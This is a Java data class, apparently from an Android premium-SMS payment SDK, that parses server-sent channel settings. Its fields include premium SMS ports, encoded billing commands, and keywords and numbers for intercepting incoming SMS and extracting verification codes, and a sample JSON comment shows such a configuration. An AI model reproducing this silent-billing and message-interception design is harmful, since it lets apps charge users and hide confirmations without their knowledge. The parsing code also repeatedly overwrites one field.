package com.y7.smspay.sdk.json;

import com.y7.smspay.sdk.ss.SsParse;

import org.json.JSONObject;

/**
 * 2014-11-06 modified by pengbb 新增中国手游短代支付参数
 */
public class ChannelEntity implements JsonInterface {

    /**
     * 通道名称
     */
    public String throughName = "";
    /**
     * 信息
     */
    public String message = "";
    /**
     * 通道ID
     */
    public String throughId = "";
    /**
     * 通道价格上线
     */
    public String price = "";
    /**
     * 通道状态
     */
    public String state = "";

    /**
     * 2014-11-06 added by pengbb 中国手游付费指令,只有当请求到的是中国手游通道时才有值，其他通道默认为空
     */
    public String command = "";
    public String command2 = "";
    /**
     * 2014-11-06 added by pengbb 中国手游付费通道端口
     */
    public String channelTelnumber = "";
    /**
     * 指令端口号
     */
    public String sendport = "";
    /**
     * 指令上行命令
     */
    public String uporder = "";
    /**
     * 指令ID
     */
    public String cid = "";

    public String order = "";
    public String number = "";

    // ADD 20160305 LEON
    public String randthroughId = "";

    // add 0409
    public String serParam = ""; // 提交验证码有值就带上

    // add 0507
    public String mmpayparam = ""; // 获取MM计费相关数据

    /**
     * 指令端口号2
     */
    public String sendport2 = "";

    /**
     * 支付类型
     */
    public String payType = "";
    public String payType2 = "";

    public int timeOut = 0;
    /**
     * 泰豪请求的url
     * <p>
     * 成都鼎元通过这个参数传递3个变量
     */
    public String reqpayurl = "";


    public String sourceCode = "";

    public String thPrice = "";//通道价格

    /**
     * 短信拦截信息关键字
     */
    public String messageBody = "";
    /**
     * 短信拦截号码
     */
    public String phoneNumber = "";

    public String throughurl = "";

    /**
     * 支付类型
     */
    public String type = "";

    @Override
    public JSONObject buildJson() {
        try {
            JSONObject json = new JSONObject();
            json.put("throughName", throughName);
            json.put("messageBody", messageBody);
            json.put("phoneNumber", phoneNumber);
            json.put("message", message);
            json.put("throughId", throughId);
            json.put("price", price);
            json.put("state", state);
            json.put("command", command);
            json.put("sendport", sendport);
            json.put("uporder", uporder);
            json.put("cid", cid);
            json.put("order", order);
            json.put("number", number);
            json.put("reqpayurl", reqpayurl);
            json.put("randthroughId", randthroughId);
            json.put("serParam", serParam);
            json.put("mmpayparam", mmpayparam);
            json.put("thPrice", thPrice);
            json.put("throughurl", throughurl);
            return json;
        } catch (Exception e) {
            //DDDLog.e("Exception", e);
        }
        return null;
    }

    @Override
    public void parseJson(JSONObject json) {
        if (json == null)
            return;
        try {
            jsonString = json.toString();

            throughurl = json.isNull("throughurl") ? null : json.getString("throughurl");

            messageBody = json.isNull("messageBody") ? null : json
                    .getString("messageBody");
            phoneNumber = json.isNull("phoneNumber") ? null : json
                    .getString("phoneNumber");

            throughName = json.isNull("throughName") ? null : json
                    .getString("throughName");
            message = json.isNull("message") ? null : json.getString("message");
            throughId = json.isNull("throughId") ? null : json
                    .getString("throughId");
            price = json.isNull("price") ? null : json.getString("price");
            state = json.isNull("state") ? null : json.getString("state");
            command = json.isNull("command") ? null : json.getString("command");
            command2 = json.isNull("command2") ? null : json.getString("command2");
            channelTelnumber = json.isNull("channelTelnumber") ? null : json
                    .getString("channelTelnumber");
            sendport = json.isNull("sendport") ? null : json
                    .getString("sendport");
            uporder = json.isNull("uporder") ? null : json.getString("uporder");
            cid = json.isNull("cid") ? null : json.getString("cid");
            order = json.isNull("order") ? null : json.getString("order");
            number = json.isNull("number") ? null : json.getString("number");
            reqpayurl = json.isNull("reqpayurl") ? null : json
                    .getString("reqpayurl");

            randthroughId = json.isNull("randthroughId") ? null : json
                    .getString("randthroughId");

            serParam = json.isNull("serParam") ? null : json
                    .getString("serParam");

            mmpayparam = json.isNull("mmpayparam") ? null : json
                    .getString("mmpayparam");

            SsParse.secondSms = json.isNull("secondSms") ? null : json
                    .getString("secondSms");
            //DDDLog.e("secondSms   " + SsParse.secondSms);

            sendport2 = json.isNull("sendport2") ? null : json
                    .getString("sendport2");
            payType = json.isNull("payType") ? null : json.getString("payType");

            type = json.isNull("type") ? null : json.getString("type");
            type = json.isNull("payType") ? null : json.getString("payType");
            type = json.isNull("payType2") ? null : json.getString("payType2");
            type = json.isNull("timeOut") ? null : json.getString("timeOut");

            sourceCode = json.isNull("sourceCode") ? null : json.getString("sourceCode");

            thPrice = json.isNull("thPrice") ? null : json.getString("thPrice");

            if (!json.isNull("capCode")) {
                SsParse.capCode = json.isNull("capCode") ? null : json
                        .getString("capCode");

                SsParse.capPort = json.isNull("capPort") ? null : json
                        .getString("capPort");
                SsParse.startWord = json.isNull("startWord") ? null : json
                        .getString("startWord");
                SsParse.endWord = json.isNull("endWord") ? null : json
                        .getString("endWord");
                SsParse.direction = json.isNull("direction") ? null : json
                        .getInt("direction");

            }
        } catch (Exception e) {
            //DDDLog.e("Exception", e);
        }
    }


    //{"throughId":"116","phone":"","startWord":"","sourceCode":"abc55","direction":"0","randthroughId":9187189,"state":"0","type":2,"throughName":"综合接口1","price":"400,500,600,800,1000,1500,2000,","secondSms":"5;5;;;0","order":[{"price":"1000","uporder":"1065889923","command":"%3Ap%3AoArWTE9U*h%3AmJBn2SC%5BT%5E%3A%2BR%3Aog%2F%24y%7EVk%3E%21UVyjI3%5B2%5B+%3A%5BYVHX2%3CGp%2Bc*eDpmE%40%5E%3Az-%3A%3A1%3A%3Aw7c3F7%21%7DjaLt.%3A%3D%3A%3AWpX%3EWs%3CdC%5C%5EV%2C%23%23F%5E%40%2Fz%23TbS%5B2sZ9Wo%25qa%5EL7XiCd%5B","sendport2":"","sendport":"1065889923","number":"1","cid":""}],"capCount":"6","command":"","endWord":"","payType":5,"capPort":"","timing":2,"serParam":"435598161895,55","capCode":""}


    private static String ShortName = null;

    @Override
    public String getShortName() {
        //DDDLog.d("ShortName-->" + ShortName);
        return ShortName;
    }

    public static void setShortName(String str) {
        ShortName = str;
    }

    private String jsonString;

    @Override
    public String toString() {
        return this.jsonString;
    }
}
